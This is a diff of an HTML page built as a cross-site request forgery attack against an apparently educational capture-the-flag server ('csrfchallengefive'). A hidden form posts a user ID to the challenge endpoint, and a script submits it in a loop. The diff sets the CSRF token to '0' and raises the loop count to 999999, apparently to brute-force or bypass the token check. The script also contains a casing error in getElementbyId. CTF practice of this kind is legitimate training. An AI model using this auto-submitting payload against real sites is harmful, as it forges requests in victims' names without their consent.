@@ -4,12 +4,12 @@
 
 <form id="completeChallenge2" action="http://cs410.oregonctf.org/user/csrfchallengefive/plusplus" method="POST">
 <input name="userId" type="hidden" value="0803943e9dc9daabd97e24c21556eac84f5c3030" />
-<input type="hidden" name="csrfToken" value="74191296316940798271447205697417323325"/>
+<input type="hidden" name="csrfToken" value="0"/>
  <input type="submit" />
 </form>
 <script>
  var i;
- for(i=0; i < 99999; i++){
+ for(i=0; i < 999999; i++){
 document.forms["completeChallenge2"].submit();
 document.getElementbyId(userId).value += i;
  }
